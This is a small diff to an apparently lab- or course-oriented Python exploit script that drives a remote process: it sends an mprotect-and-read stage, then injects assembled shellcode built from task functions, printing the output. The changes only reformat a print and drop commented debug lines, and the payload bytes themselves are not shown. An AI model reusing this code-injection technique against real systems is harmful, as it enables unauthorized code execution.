@@ -438,7 +438,7 @@ if __name__ == '__main__':
     # [first send] -> mprotect & read from user input
     send_line = mprotect_read_byte()
     r.send(send_line)
-    print("bytes command received output: ", r.recvuntil("bytes command received.\n", drop=False).decode())
+    print("bytes command received output:\n", r.recvuntil("bytes command received.\n", drop=False).decode())
 
     # 1st write codeint output in mprotect_read_byte() -> if [mprotect_read_byte()'s 1st write] comment out, than this needs to turn off
     print(" ==================== 1st write output in mprotect_read_byte() ==================== ")
@@ -446,16 +446,12 @@ if __name__ == '__main__':
 
     # [second send] -> input the asm we want to execute and it will be store into the start of codeint
     send_line_2 = task_2_asm_byte() + task_3_asm_byte() + task_4_asm_byte() + exit_0_asm_byte()
-    # send_line_2 = task_4_asm_byte() + exit_0_asm_byte()
     print("send_line_2 to read:\n", send_line_2)
     r.send(send_line_2)
-    # print("after send 2 - 1")
 
     # 2nd write codeint output in mprotect_read_byte() -> if [mprotect_read_byte()'s 2nd write] comment out, than this needs to turn off
     print("\n ==================== 2nd write output in mprotect_read_byte() ==================== ")
     print(r.recv())
-
-    # print("after send 2 - 2")
 
     # 2nd write codeint output
     print("")
